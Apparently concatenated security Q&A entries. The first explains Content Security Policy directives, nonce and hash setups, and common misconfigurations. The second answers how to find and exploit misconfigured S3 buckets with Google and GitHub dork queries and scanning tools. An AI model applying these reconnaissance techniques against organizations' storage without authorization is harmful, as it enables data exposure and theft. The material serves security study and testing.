Content Security Policy (CSP): HTTP response header that instructs browser which sources are trusted for loading resources; primary defense against XSS. Key directives: default-src (fallback for all resource types not explicitly set); script-src (JavaScript sources); style-src (CSS sources); img-src (image sources); connect-src (fetch, XHR, WebSocket endpoints); font-src; frame-src (iframes); object-src (plugins); base-uri (base element -- prevent base tag injection). Strict CSP (nonce-based, recommended): script-src nonce-RANDOM_VALUE strict-dynamic; nonce is a unique random value per response: import secrets; nonce = secrets.token_urlsafe(16); set CSP header with this nonce; add nonce attribute to every inline script tag: <script nonce="VALUE">; strict-dynamic trusts scripts loaded by trusted inline scripts (removes need to whitelist CDN URLs); eliminates most injection vectors. Hash-based alternative: sha256-BASE64_HASH in script-src; hash of exact script content; works for static inline scripts. Implementing: start with CSP report-only mode: Content-Security-Policy-Report-Only: policy; report-uri /csp-report-endpoint; collect violations without blocking; fix violations (inline scripts: add nonce; external scripts: add to allowlist); switch to enforcement mode. Common mistakes: unsafe-inline defeats inline XSS protection (use nonces instead); script-src with CDN wildcard (*.cloudflare.com -- JSONP endpoints on CDN bypass CSP); missing object-src none (Flash/plugin injection); missing base-uri (base tag injection); not setting frame-ancestors (clickjacking). Test with CSP Evaluator; Google CSP with strict-dynamic guide.
How do you identify and exploit misconfigured S3 buckets?

S3 bucket misconfiguration discovery and exploitation: Discovery: Google dorking: site:s3.amazonaws.com COMPANY; site:s3-us-east-1.amazonaws.com; in Burp traffic look for S3 URLs; check Wayback Machine for S3 references; GitHub dorking: org:company s3.amazonaws.com OR amazonaws.com; tools: S3Scanner (scan list of bucket names); BucketFinder; cloud_enum.
